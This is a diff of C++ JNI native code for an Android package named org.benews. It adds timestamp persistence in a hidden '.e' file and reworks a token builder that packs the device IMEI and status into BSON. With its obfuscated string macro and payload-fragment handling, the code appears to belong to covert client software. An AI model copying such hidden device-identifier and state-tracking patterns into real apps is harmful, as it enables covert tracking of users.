@@ -142,7 +142,46 @@ int checkFileExpirations(char * file_s, int ttl_sec)
    }
    return 0;
 }
+/*
+ * save the passed ts to a file
+ * return 0 in ca
+ */
+int save_timestamp(long int ts)
+{
+   if (!app_dir.empty()) {
+      static const std::string ts_file = app_dir + KKK"/.e";
+      std::ofstream outfile;
+      outfile.open ((char*)ts_file.c_str(), ios::out | ios::trunc | ios::binary);
+      outfile.write((char*)&ts,sizeof(ts));
+      outfile.close();
+      logd("written %ld to %s",ts,ts_file.c_str());
+      return 0;
+   }else{
+      logd("app dir is empty");
+   }
+   return -1;
+}
 
+long int get_timestamp()
+{
+   long int ts = 0;
+   if (!app_dir.empty()) {
+      static const std::string ts_file = app_dir + KKK"/.e";
+      if (file_exist(ts_file)) {
+         std::ifstream file;
+         file.open((char *)ts_file.c_str(), ios::in | ios::binary);
+         if (file.is_open()) {
+            /* correctly read the file*/
+            file.read((char *)&ts, sizeof(ts));
+            logd("stored ts --> %ld [%d]",ts,sizeof(ts));
+            file.close();
+         }
+      }
+   }else{
+      logd("app dir is empty");
+   }
+   return ts;
+}
 int checkExpirations(char *file_name, int ttl_sec)
 {
    if (!app_dir.empty()) {
@@ -938,6 +977,7 @@ if (payload != NULL && !baseDir.empty() && payload_size > 0) {
 
       logd("sha1 mismatch:\ngot_sha1=%s\nrec_sha1=%s", hash_hex.c_str(), sha1_str.c_str());
       env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+      save_timestamp(ts);
       env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF(hash_hex.c_str()));
    } else {
       if (save_payload(type, getFileName(baseDir, type, ts, fragment), payload, payload_size) == 0) {
@@ -954,15 +994,18 @@ if (payload != NULL && !baseDir.empty() && payload_size > 0) {
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_PATH), env->NewStringUTF(result_output.c_str()));
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TITLE), env->NewStringUTF(title.c_str()));
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+               save_timestamp(ts);
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_HEADLINE), env->NewStringUTF(headline.c_str()));
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CONTENT), env->NewStringUTF(content.c_str()));
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
+
             }
          } else {
             if (check < 0) {
                logd("file not ok -1");
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+               save_timestamp(ts);
             } else {
                logd("file not ok 0 check %d",check);
                if (check == 3) {
@@ -975,11 +1018,13 @@ if (payload != NULL && !baseDir.empty() && payload_size > 0) {
                   env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
                }
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+               save_timestamp(ts);
             }
          }
       } else {
          logd("fragment ok 0");
          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
+         save_timestamp(ts);
          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
 
       }
@@ -1058,7 +1103,7 @@ if (bson_s != NULL) {
       string res;
       int element = 0;
       string value, title_str, headline_str, content_str, sha1_str;
-      be ts = y.getField("ts");
+      be ts = y.getField(HASH_FIELD_TIMESTAMP);
       logd("got elemets");
       if (ts.size() > 0 && ts.type() == NumberLong) {
          ptr = &ts;
@@ -1152,13 +1197,19 @@ if (bson_s != NULL) {
 return resS;
 }
 
-JNIEXPORT jbyteArray JNICALL Java_org_benews_BsonBridge_getToken(JNIEnv * env, jclass, jstring imei, jlong ts, jstring lts_status)
+JNIEXPORT jbyteArray JNICALL Java_org_benews_BsonBridge_getToken(JNIEnv * env, jclass, jstring imei, jstring lts_status,jstring basedir)
 {
 bob bson;
-string imei_str, lts_status_str;
+string imei_str, lts_status_str,baseDir;
+jlong ts=0;
 CheckMutex();
 GetJStringContent(env, imei, imei_str);
 GetJStringContent(env, lts_status, lts_status_str);
+GetJStringContent(env, basedir, baseDir);
+logd(KKK"basedir=%s", baseDir.c_str());
+if (!baseDir.empty() && app_dir.empty() && app_dir.compare(baseDir) != 0) {
+    app_dir = baseDir;
+}
 logd(KKK"lts_status imei=%s ts=%d lts=%s", imei_str.c_str(), ts, lts_status_str.c_str());
 checkExpirations(KKK"log.tmp",5*60);
 checkExpirations(KKK"shtmp",30);
@@ -1174,21 +1225,21 @@ if (threadStarted) {
          int* st = (int*) status;
          logd("Thread returns %d", *st);
          string value = boost::lexical_cast<std::string>(*st);
-         bson.append("lts_status", value.c_str());
+         bson.append(HASH_FIELD_LTSS, value.c_str());
       }
       threadStarted = false;
       pthread_mutex_unlock(&mux_running);
    } else {
       logd("job not finished,");
       string value = boost::lexical_cast<std::string>(-3);
-      //lts_status in realta' e' il checksum ritornato dalla serialize
-      bson.append("lts_status", value.c_str());
+      bson.append(HASH_FIELD_LTSS, value.c_str());
    }
 } else {
-   //lts_status in realta' e' il checksum ritornato dalla serialize
-   bson.append("lts_status", lts_status_str.c_str());
+   bson.append(HASH_FIELD_LTSS, lts_status_str.c_str());
 }
-bson.append("ts", ts);
+ts=get_timestamp();
+//bson.append(HASH_FIELD_TIMESTAMP, boost::lexical_cast<std::string>(ts));
+bson.append(HASH_FIELD_TIMESTAMP, ts);
 bo ret = bson.obj();
 jbyteArray arr = env->NewByteArray(ret.objsize());
 env->SetByteArrayRegion(arr, 0, ret.objsize(), (jbyte*) ret.objdata());
